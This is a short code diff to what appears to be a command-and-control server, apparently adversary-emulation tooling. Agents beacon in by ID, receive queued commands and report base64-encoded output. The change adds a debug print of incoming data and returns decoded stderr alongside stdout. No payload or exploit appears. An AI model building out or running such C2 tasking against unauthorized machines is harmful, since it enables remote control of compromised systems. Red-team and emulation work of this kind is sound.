@@ -31,6 +31,8 @@ def beacon():
     paw = json_data.get("paw")
     results = json_data.get("results", [])
 
+    print("[DEBUG] Received data:", json_data)
+
     if not paw:
         return jsonify({"error": "Missing agent ID"}), 400
 
@@ -125,12 +127,20 @@ async def send_command():
     for result in results:
         if result["id"] == commandId:
             output = result.get("output")
+            stderr = result.get("stderr")
             decoded_output = decode_base64(output)
+            decoded_stderr = decode_base64(stderr)
 
             agents[agent]["results"].remove(result)
             agents[agent]["instructions"].remove(instruction)
             del commandEvents[commandId]
-            return jsonify({"message": "Command executed", "output": decoded_output})
+            return jsonify(
+                {
+                    "message": "Command executed",
+                    "output": decoded_output,
+                    "stderr": decoded_stderr,
+                }
+            )
 
     return jsonify({"message": "Command sent, no response received"})
 
